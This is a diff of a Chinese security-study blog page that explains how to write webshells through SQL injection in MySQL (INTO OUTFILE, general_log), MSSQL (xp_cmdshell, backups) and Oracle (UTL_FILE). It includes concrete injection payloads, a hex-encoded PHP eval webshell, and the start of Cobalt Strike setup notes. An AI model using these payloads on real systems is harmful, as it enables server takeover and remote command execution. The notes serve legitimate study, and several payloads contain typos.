@@ -327,15 +327,15 @@ if (true) {
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">INTO</span> OUTFILE ‘物理路径’ lines terminatedby （这里是WebShell）#</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">INTO</span> OUTFILE ‘物理路径’ fields terminatedby （这里是WebShell）#</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">INTO</span> OUTFILE’物理路径’columns terminatedby （这里是WebShell）#</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">INTO</span> OUTFILE ‘物理路径’ lines startingby （这里是WebShell）#</span><br></pre></td></tr></table></figure>
 
 <h4 id="outfile写入webshell操作"><a href="#outfile写入webshell操作" class="headerlink" title="outfile写入webshell操作"></a>outfile写入webshell操作</h4><h5 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h5><p>检查<code>secure_file_priv</code>是否开启：<code>show variables like‘%secure%’</code>;确认其不为NULL。有值或为空都可以。（若是为NULL，则需要到<code>my.ini</code>文件中手动修改）<br>检查当前用户是否具备写权限：<code>selectuser,file_priv from mysql.user</code>;确认其用户的值为Y即代表此用户拥有文件写入权限。</p>
-<h5 id="确认注入点"><a href="#确认注入点" class="headerlink" title="确认注入点"></a>确认注入点</h5><p><code>http:/127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1; 参数ID存在SQL注入漏洞 </code>http:&#x2F;127.0.0.1&#x2F;DVWA-master&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;1’union select version(),user()#&#96;</p>
+<h5 id="确认注入点"><a href="#确认注入点" class="headerlink" title="确认注入点"></a>确认注入点</h5><p><code>http:/127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1;</code><br>参数ID存在SQL注入漏洞<br><code>http:/127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1’union select version(),user()#</code></p>
 <h5 id="利用outfile写入shell文件"><a href="#利用outfile写入shell文件" class="headerlink" title="利用outfile写入shell文件"></a>利用outfile写入shell文件</h5><p>若<code>secure_file_priv</code>为空，则可以向任意目录写入文件;若<code>secure_file_priv</code>有值，则只能向该值指向的目录写入文件，因为我们的值为空，所以就任意目录写入，但因为还需要工具进行连接，所以最好放在网站的根目录下。</p>
-<p>PAYLOAD（使用Union查询注入）：<br><code>1‘union select1,”” into outfile“F:\PhpStudy20180211\PHPTutorial\WWW\Tp.php‘’# PAYLOAD（不用Union）： </code>1’into outfile“F:\Php、Study2018021\PHPTutorial\WWW\Tp.php” fields terminated by “”#</p>
+<p>PAYLOAD（使用Union查询注入）：<br><code>1‘union select1,”” into outfile“F:\PhpStudy20180211\PHPTutorial\WWW\Tp.php‘’#</code><br>PAYLOAD（不用Union）：<br><code>1’into outfile“F:\Php、Study2018021\PHPTutorial\WWW\Tp.php” fields terminated by “”#</code></p>
 <p>文件已被写入到网站的根目录下，接下来就可以使用连接工具（蚁剑、菜刀、冰蝎等）进行连接了</p>
 <h4 id="基于log日志写入法"><a href="#基于log日志写入法" class="headerlink" title="基于log日志写入法"></a>基于log日志写入法</h4><blockquote>
 <p>基于log日志写入的方法其实是先将日志文件的导出目录修改成Web目录，然后执行了一次简单的WebShell代码查询功能，此时日志文件记录了此过程，这样再Web目录下的日志文件就变成了WebShell。</p>
 </blockquote>
 <p>例如，我们先设置日志文件的导出目录：<code>set global general_file=‘Web目录’</code>；然后执行一遍：<code>select “WebShell代码”</code>；即可。</p>
-<h4 id="导入日志写webshell操作"><a href="#导入日志写webshell操作" class="headerlink" title="导入日志写webshell操作"></a>导入日志写webshell操作</h4><h5 id="准备："><a href="#准备：" class="headerlink" title="准备："></a>准备：</h5><p>检查当前MySQL下log日志是否开启，以及log的默认地址在哪里：<br><code>show variables like ‘%general%’; 将log日志开启，并设置日志的写入位置: </code>Set globalgeneral_log &#x3D; on;<br>&#96;Set globalgeneral_log_file &#x3D;‘F:&#x2F;test.php’;</p>
+<h4 id="导入日志写webshell操作"><a href="#导入日志写webshell操作" class="headerlink" title="导入日志写webshell操作"></a>导入日志写webshell操作</h4><h5 id="准备："><a href="#准备：" class="headerlink" title="准备："></a>准备：</h5><p>检查当前MySQL下log日志是否开启，以及log的默认地址在哪里：<br><code>show variables like ‘%general%’;</code><br>将log日志开启，并设置日志的写入位置:<br><code>Set globalgeneral_log = on;</code><br><code>Set globalgeneral_log_file =‘F:/test.php’;</code></p>
 <h5 id="使用写入日志再读取的方法写webshell"><a href="#使用写入日志再读取的方法写webshell" class="headerlink" title="使用写入日志再读取的方法写webshell"></a>使用写入日志再读取的方法写webshell</h5><p>直接在SQL注入点，使用查询语句，添加WebShell代码，WebShell代码被记录到日志文件中，接下就可以使用连接工具进行连接了。</p>
 <h3 id="Mssql写入webshell条件"><a href="#Mssql写入webshell条件" class="headerlink" title="Mssql写入webshell条件"></a>Mssql写入webshell条件</h3><ol>
 <li>有相应的权限db_owner</li>
@@ -357,7 +357,7 @@ if (true) {
 <li>xp_dirtree</li>
 </ul>
 </li>
-<li>execute master…xp_dirtree ‘c:’;可以查出所有c:\下的文件、目录、子目录</li>
+<li><code>execute master…xp_dirtree ‘c:’</code>;可以查出所有c:\下的文件、目录、子目录</li>
 </ul>
 </li>
 </ul>
@@ -365,16 +365,16 @@ if (true) {
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure ‘show advanced options’,1;//允许修改高级参数RECONFIGURE;</span><br><span class="line">EXEC sp_configure ‘xp_cmdshell’,1;//打开xp_cmdshell扩展RECONFIGURE;–打开xp_cmdshell扩展</span><br></pre></td></tr></table></figure>
 
 <h5 id="执行CMD命令查询"><a href="#执行CMD命令查询" class="headerlink" title="执行CMD命令查询"></a>执行CMD命令查询</h5><p>开启了<code>xp_cmdshell</code>之后我们就可以执行CMD命令了，例如:<br><code>for /r c:%i in (1*.php) do @echo %i</code><br>就可以查询c:\目录下的所有符合<code>1*.php</code>的文件<br>同理，在实际应用中，我们也是新建一个表，并将<code>xp_cmdshell</code>查询到的信息插入后，再次查询即可。</p>
-<h5 id="使用xp-cmdshell写入WebShell"><a href="#使用xp-cmdshell写入WebShell" class="headerlink" title="使用xp_cmdshell写入WebShell"></a>使用xp_cmdshell写入WebShell</h5><p>我们可以通过<code>xp_cmdshell</code>执行系统CMD命令，例如我们可以使用CMD中的echo命令，将WebShell的代码写入到网站目录下，所以我们必须提前知道Web目录的绝对路径。<br>PAYLOAD：<br>&#96;1’;execmaster…xp_cmdshell’echo^&gt;F:\PhpStudy20180211\PHPTutorial\WWW\cmd.php’;&#96;&#96;</p>
+<h5 id="使用xp-cmdshell写入WebShell"><a href="#使用xp-cmdshell写入WebShell" class="headerlink" title="使用xp_cmdshell写入WebShell"></a>使用xp_cmdshell写入WebShell</h5><p>我们可以通过<code>xp_cmdshell</code>执行系统CMD命令，例如我们可以使用CMD中的echo命令，将WebShell的代码写入到网站目录下，所以我们必须提前知道Web目录的绝对路径。<br>PAYLOAD：<br><code>1’;execmaster…xp_cmdshell’echo^&gt;F:\PhpStudy20180211\PHPTutorial\WWW\cmd.php’;</code></p>
 <h4 id="使用差异备份怎样写入WebShell"><a href="#使用差异备份怎样写入WebShell" class="headerlink" title="使用差异备份怎样写入WebShell"></a>使用差异备份怎样写入WebShell</h4><h5 id="数据库备份"><a href="#数据库备份" class="headerlink" title="数据库备份"></a>数据库备份</h5><p>首先对某一数据库进行备份。<br>PAYLOAD：<br><code>id=1’;backup database 库名 to disk=‘F:\PhpStudy20180211\PHPTutorial\WWW\back.bak’;</code></p>
 <h5 id="将WebShell代码写入数据库中"><a href="#将WebShell代码写入数据库中" class="headerlink" title="将WebShell代码写入数据库中"></a>将WebShell代码写入数据库中</h5><p>PAYLOAD：<br><code>id=1’; create table cybk([cmd][image]);#创建一个新表</code><br>PAYLOAD：<br><code>id=1’;insertintocybk(cmd)vaues(0x3C3F706870206576616C28245F504F53545B2770617373275D293B203F3E);#将WebShell的代码转换成ASCII码</code></p>
 <p>最后将此数据库进行差异备份，这样其中就会包含刚刚写入的WebShell代码</p>
-<p>PAYLOAD：<br>&#96;id&#x3D;1’; backup database library todisk&#x3D;‘F:\PhpStudy20180211\PHPTutorial\WWW\cybk.php’ WITHDIFFERENTIAL,FORMAT;</p>
+<p>PAYLOAD：<br><code>id=1’; backup database library todisk=‘F:\PhpStudy20180211\PHPTutorial\WWW\cybk.php’ WITHDIFFERENTIAL,FORMAT;</code></p>
 <h4 id="使用log备份写入WebShell"><a href="#使用log备份写入WebShell" class="headerlink" title="使用log备份写入WebShell"></a>使用log备份写入WebShell</h4><p>要求</p>
 <p>数据库已经备份过，且选择完整模式的恢复模式.<br>相比较差异备份而言，使用Log备份文件会小的多</p>
 <p>首先需要将数据库设置为完整恢复模式，然后创建一个新表，将WebShell用Ascii编码后写入其中，然后将该数据库的日志信息导出到Web目录，即可。</p>
 <h3 id="ORACLE写入WebShell条件"><a href="#ORACLE写入WebShell条件" class="headerlink" title="ORACLE写入WebShell条件"></a>ORACLE写入WebShell条件</h3><p>1.有DBA权限<br>2.获得Web目录的绝对路径</p>
-<h3 id="Oracle写webshell怎样写"><a href="#Oracle写webshell怎样写" class="headerlink" title="Oracle写webshell怎样写"></a>Oracle写webshell怎样写</h3><h4 id="使用文件访问包方法写入Webshell"><a href="#使用文件访问包方法写入Webshell" class="headerlink" title="使用文件访问包方法写入Webshell"></a>使用文件访问包方法写入Webshell</h4><p>创建一个ORACLE的目录对象指向某一路径，在真实环境中需要指向Web目录下，在这里我们将其指向<code>/home/oracle</code>这一路径下：<br><code>create or replace directory IST0_DIR as ‘/home/oracle’;</code>创建ORACLE目录对象<br>创建好后，我们需要对其进行一下授权过程，让其能够顺利的写入WebShell代码。<br><code>grant read, write on directory IST0_DIR tosystem;`` 然后写入文件，定义变量类型为</code>utl_file.file_type&#96;，然后将WebShell的代码写入此文件中。<br>直接访问该文件，即可查看到其中的WebShell代码，如果这个文件是放置在Web目录下的，那么就可以被攻击者成功利用。</p>
+<h3 id="Oracle写webshell怎样写"><a href="#Oracle写webshell怎样写" class="headerlink" title="Oracle写webshell怎样写"></a>Oracle写webshell怎样写</h3><h4 id="使用文件访问包方法写入Webshell"><a href="#使用文件访问包方法写入Webshell" class="headerlink" title="使用文件访问包方法写入Webshell"></a>使用文件访问包方法写入Webshell</h4><p>创建一个ORACLE的目录对象指向某一路径，在真实环境中需要指向Web目录下，在这里我们将其指向<code>/home/oracle</code>这一路径下：<br><code>create or replace directory IST0_DIR as ‘/home/oracle’;</code>创建ORACLE目录对象<br>创建好后，我们需要对其进行一下授权过程，让其能够顺利的写入WebShell代码。<br><code>grant read, write on directory IST0_DIR tosystem;</code><br>然后写入文件，定义变量类型为<code>utl_file.file_type</code>，然后将WebShell的代码写入此文件中。<br>直接访问该文件，即可查看到其中的WebShell代码，如果这个文件是放置在Web目录下的，那么就可以被攻击者成功利用。</p>
 <h2 id="CS如何上线Windows"><a href="#CS如何上线Windows" class="headerlink" title="CS如何上线Windows"></a>CS如何上线Windows</h2><ul>
 <li>配置teamserver [ip] [密码]</li>
 <li>打开CS，连接teamserver服务器</li>
